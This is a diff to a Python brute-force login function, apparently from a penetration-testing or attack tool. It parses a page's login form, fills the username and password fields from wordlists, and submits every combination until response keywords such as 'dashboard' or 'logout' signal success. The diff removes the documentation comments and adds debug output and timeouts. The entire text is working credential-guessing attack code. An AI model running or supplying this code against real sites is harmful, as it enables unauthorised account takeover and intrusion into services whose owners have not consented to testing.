@@ -5,23 +5,8 @@ import os
 from urllib.parse import urljoin
 
 def brute_force_login(page_url, session):
-    """
-    Attempts brute-force login by:
-    - Parsing the form dynamically
-    - Building the correct form action URL
-    - Submitting username/password combos
-
-    Args:
-        page_url (str): The URL where the login form is located.
-        session (requests.Session): Active session to maintain state.
-
-    Returns:
-        tuple or None: (username, password) if successful; else None.
-    """
-
     print(f"[*] Starting brute-force login on: {page_url}")
-    
-    # Step 1: Fetch and parse the login page
+
     try:
         resp = session.get(page_url, timeout=10)
         soup = BeautifulSoup(resp.text, "html.parser")
@@ -29,18 +14,17 @@ def brute_force_login(page_url, session):
         print(f"[!] Failed to load login page: {e}")
         return None
 
-    # Step 2: Find form
     form = soup.find("form")
     if not form:
         print("[-] No <form> found on the page.")
         return None
 
-    # Step 3: Resolve action and method
     action = form.get("action")
+    print(" action",action )
     form_action = urljoin(page_url, action) if action else page_url
+    print("form action, ", form_action)
     method = form.get("method", "post").lower()
 
-    # Step 4: Extract input fields
     inputs = form.find_all("input")
     input_names = [i.get("name") for i in inputs if i.get("name")]
 
@@ -58,32 +42,39 @@ def brute_force_login(page_url, session):
         print("[-] Username or password file not found.")
         return None
 
-    # Step 5: Brute-force all combos
     for username, password in product(usernames, passwords):
         data = {}
-        for name in input_names:
-            if "user" in name or "email" in name or "uid" in name or "login" in name:
+        for tag in inputs:
+            name = tag.get("name")
+            if not name:
+                continue
+            # Fill based on name heuristics
+            if any(k in name.lower() for k in ["user", "email", "uid", "login"]):
                 data[name] = username
-            elif "pass" in name or "passw" in name or "password" in name or "pwd" in name:
+            elif any(k in name.lower() for k in ["pass", "pwd"]):
                 data[name] = password
             else:
-                data[name] = "test"
+                data[name] = tag.get("value", "test")  # Keep default or dummy
 
         print(f"Trying: {username} | {password}")
         try:
             if method == "post":
-                response = session.post(form_action, data=data)
+                response = session.post(form_action, data=data, timeout=10)
             else:
-                response = session.get(form_action, params=data)
+                response = session.get(form_action, params=data, timeout=10)
+            # Debugging output
+            if username == "admin" and password == "admin":
+                print(f"[DEBUG] Status: {response.status_code} | URL: {response.url}")
+                print(f"[DEBUG] Response Snippet:\n{response.text}\n")
+
             text = response.text.lower()
 
-            # Heuristic to detect login success
             if any(k in text for k in ["logout", "welcome", "dashboard", "you have logged in", "hello"]):
                 print(f"[+] Brute-force success: {username}:{password}")
                 return (username, password)
 
         except Exception as e:
-            print(f"[!] Error for {username}:{password} → {e}")
+            print(f"[!] Error during attempt {username}:{password} → {e}")
 
     print("[-] No valid credentials found.")
     return None
